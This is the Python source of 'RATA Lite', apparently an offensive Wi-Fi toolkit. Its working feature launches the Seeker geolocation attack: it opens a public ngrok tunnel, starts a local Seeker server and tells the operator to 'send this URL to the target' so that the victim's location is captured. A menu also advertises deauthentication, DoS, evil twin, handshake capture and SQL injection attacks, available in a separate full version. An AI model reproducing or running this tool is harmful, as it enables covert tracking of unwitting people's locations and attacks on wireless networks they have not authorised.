
import os
import sys
import subprocess
import time
import re
import shutil
import json
try:
    import requests
except ImportError:
    print("\033[0;31mError: 'requests' library not found. Please install it using: pip install requests\033[0m")
    sys.exit(1)
try:
    from msvcrt import getch
except ImportError:
    import termios
    import tty
    def getch():
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setraw(fd)
            return sys.stdin.read(1)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)

RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[0;34m'
NC = '\033[0m'

class WifiToolkitLite:
    """
    RATA (Recon & Analysis Toolkit by DLA) - Lite Version
    This version provides access to the Seeker Geolocation attack
    and promotes the full version of the toolkit.
    """
    def __init__(self):
        self.active_processes = []
        self.interface = "wlan0"

    def _run_command(self, command, shell=False, quiet=False):
        """Executes a shell command."""
        try:
            if quiet:
                return subprocess.run(command, shell=shell, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            else:
                return subprocess.run(command, shell=shell, check=True)
        except FileNotFoundError:
            print(f"{RED}Error: Command not found: {command[0]}{NC}")
            return None
        except subprocess.CalledProcessError as e:
            if not quiet and e.returncode != -2:
                print(f"{RED}Error executing command: {' '.join(command)}{NC}")
            return None
        except Exception as e:
            print(f"{RED}An unexpected error occurred: {e}{NC}")
            return None

    def _print_header(self):
        """Prints the script header."""
        os.system('clear')
        art = f"""
{YELLOW}               ██████╗  █████╗ ████████╗ █████╗ 
{YELLOW}               ██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗
{YELLOW}               ██████╔╝███████║   ██║   ███████║
{YELLOW}               ██╔══██╗██╔══██║   ██║   ██╔══██║
{YELLOW}               ██║  ██║██║  ██║   ██║   ██║  ██║
{YELLOW}               ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
"""
        print(art)
        title = "RATA (Recon & Analysis Toolkit by DLA) v2.9.7 - LITE"
        github_link = "https://github.com/jimbon25/WIFI-TOOLKIT"
        saweria_link = "https://saweria.co/dimasla"
        print(f"{BLUE}{'=' * 70}{NC}")
        print(f"{YELLOW}{title.center(70)}{NC}")
        print(f"{YELLOW}{github_link.center(70)}{NC}")
        print(f"{YELLOW}{f'Support the project: {saweria_link}'.center(70)}{NC}")
        print(f"{BLUE}{'=' * 70}{NC}\n")

    def _show_download_prompt(self):
        """Displays a message prompting the user to download the full version."""
        self._print_header()
        print(f"{YELLOW}======================[ FULL VERSION REQUIRED ]======================{NC}")
        print()
        print(f"  This feature is only available in the full, compiled version of RATA.")
        print(f"  To get access to all attack modules, please download the latest")
        print(f"  release from the official GitHub page.")
        print()
        print(f"  {GREEN}Download Link:{NC}")
        print(f"  {BLUE}https://github.com/jimbon25/WIFI-TOOLKIT/releases/tag/v2.9.6{NC}")
        print()
        print(f"{YELLOW}==================================================================={NC}")
        print(f"\n{GREEN}Press any key to return to the main menu...{NC}")
        getch()

    def _check_seeker_dependencies(self):
        """Checks for dependencies required by the Seeker tool."""
        self._print_header()
        print(f"{YELLOW}[*] Checking dependencies for Seeker (php, ssh, ngrok)...{NC}")
        missing_deps = []
        deps_to_check = ['php', 'ssh', 'ngrok']
        
        for dep in deps_to_check:
            if not shutil.which(dep):
                missing_deps.append(dep)
        
        if missing_deps:
            print(f"\n{RED}[!] Missing required dependencies for Seeker: {', '.join(missing_deps)}{NC}")
            print(f"{YELLOW}    Please install them to use this feature.{NC}")
            print(f"{YELLOW}    Example for Debian/Ubuntu: sudo apt update && sudo apt install -y {' '.join(missing_deps)}{NC}")
            print(f"\n{GREEN}Press any key to return to the main menu...{NC}")
            getch()
            return False
        
        print(f"{GREEN}[✔] All Seeker dependencies are installed.{NC}")
        time.sleep(2)
        return True

    def run_seeker_attack(self):
        """Initializes and runs the Seeker geolocation attack."""
        if not self._check_seeker_dependencies():
            return

        self._print_header()
        print(f"{YELLOW}[*] Initializing Geolocation Attack (Seeker)...{NC}")

        seeker_script = os.path.join(os.getcwd(), 'seeker', 'seeker.py')
        if not os.path.exists(seeker_script):
            print(f"{RED}[!] Seeker script not found at: {seeker_script}{NC}")
            print(f"{YELLOW}[*] Please make sure the 'seeker' directory is in the project root.{NC}")
            time.sleep(4)
            return

        ngrok_proc = None
        try:
            print(f"{YELLOW}[*] Starting ngrok tunnel for port 8080...{NC}")
            self._run_command(['pkill', '-f', 'ngrok'], quiet=True)
            time.sleep(1)
            
            ngrok_cmd = ['ngrok', 'http', '8080', '--log=stdout']
            ngrok_proc = subprocess.Popen(ngrok_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.active_processes.append(ngrok_proc)
            print(f"{YELLOW}[*] Waiting for ngrok to establish a tunnel...{NC}")
            time.sleep(4)

            public_url = None
            try:
                response = requests.get('http://127.0.0.1:4040/api/tunnels', timeout=5)
                response.raise_for_status()
                tunnels = response.json()['tunnels']
                for tunnel in tunnels:
                    if tunnel.get('proto') == 'https':
                        public_url = tunnel.get('public_url')
                        break
                if not public_url:
                    raise ValueError("Could not find an HTTPS tunnel from ngrok API.")
                print(f"{GREEN}[✔] Ngrok tunnel is live!{NC}")
            except (requests.exceptions.RequestException, ValueError, KeyError) as e:
                print(f"{RED}[!] Failed to get ngrok public URL: {e}{NC}")
                public_url = "Failed to retrieve. Check ngrok status manually."

            print(f"\n{BLUE}{'=' * 70}{NC}")
            print(f"{YELLOW}  SEND THIS URL TO THE TARGET: {GREEN}{public_url}{NC}")
            print(f"{BLUE}{'=' * 70}{NC}\n")
            
            print(f"{YELLOW}[*] Starting Seeker. Please follow the on-screen prompts.{NC}")
            print(f"{YELLOW}[*] When you are finished, press Ctrl+C in the Seeker prompt to stop.{NC}")
            time.sleep(4)

            # Flush stdin to prevent input from bleeding into the subprocess
            try:
                import termios
                termios.tcflush(sys.stdin, termios.TCIFLUSH)
            except ImportError:
                pass # Not on a Unix-like system

            seeker_dir = os.path.join(os.getcwd(), 'seeker')
            subprocess.run(['python3', seeker_script], cwd=seeker_dir)

        except KeyboardInterrupt:
            print(f"\n{YELLOW}Main toolkit interrupted. Stopping Seeker attack...{NC}")
        except Exception as e:
            print(f"\n{RED}An error occurred: {e}{NC}")
        finally:
            print(f"\n{YELLOW}[*] Shutting down ngrok and cleaning up...{NC}")
            if ngrok_proc and ngrok_proc.poll() is None:
                ngrok_proc.terminate()
                if ngrok_proc in self.active_processes:
                    self.active_processes.remove(ngrok_proc)
            self._run_command(['pkill', '-f', 'ngrok'], quiet=True)
            print(f"{GREEN}[✔] Seeker attack session finished.{NC}")
            print(f"{GREEN}Press any key to return to the main menu...{NC}")
            getch()

    def show_main_menu(self):
        """Displays the main menu and handles user input."""
        while True:
            self._print_header()
            print(f"{YELLOW}Select an option:{NC}")
            print(f"  {BLUE}[1]{NC} Network Scanning (airodump-ng)")
            print(f"  {BLUE}[2]{NC} DoS Attacks (mdk4, aireplay)")
            print(f"  {BLUE}[3]{NC} Mass Deauthentication (mdk4)")
            print(f"  {BLUE}[4]{NC} Interactive Deauth (aireplay-ng)")
            print(f"  {BLUE}[5]{NC} Handshake Capture")
            print(f"  {BLUE}[6]{NC} Evil Twin Attack")
            print(f"  {BLUE}[7]{NC} SQL Injection (sqlmap)")
            print(f"  {BLUE}[8]{NC} Network Mapper (nmap)")
            print(f"  {BLUE}[9]{NC} Stealth Mode")
            print(f"  {BLUE}[10]{NC} Bandwidth Limiter (evillimiter)")
            print(f"  {GREEN}[11]{NC} Geolocation Attack (Seeker)")
            print(f"  {RED}[12]{NC} Exit")
            print(f"\n{YELLOW}Enter your choice [1-12] and press Enter:{NC} ", end='')
            choice = input().strip()

            if choice == '11':
                self.run_seeker_attack()
            elif choice == '12':
                print(f"{YELLOW}Exiting... Thank you for using RATA!{NC}")
                break
            elif choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
                self._show_download_prompt()
            else:
                print(f"\n{RED}Invalid option. Please try again.{NC}")
                time.sleep(1)

    def cleanup(self):
        """Cleans up any running processes before exiting."""
        print(f"\n{YELLOW}[*] Cleaning up active processes...{NC}")
        for proc in self.active_processes:
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except (Exception, subprocess.TimeoutExpired):
                    proc.kill()
        print(f"{GREEN}[✔] Cleanup complete.{NC}")

def main():
    """Main function to run the toolkit."""
    if os.geteuid() != 0:
        print(f"{RED}This script must be run as root. Please use 'sudo'.{NC}")
        sys.exit(1)
        
    toolkit = WifiToolkitLite()
    try:
        toolkit.show_main_menu()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Operation cancelled by user. Exiting...{NC}")
    finally:
        toolkit.cleanup()
        try:
            import termios
            fd = sys.stdin.fileno()
            termios.tcsetattr(fd, termios.TCSADRAIN, termios.tcgetattr(fd))
        except (ImportError, termios.error):
            pass

if __name__ == "__main__":
    main()
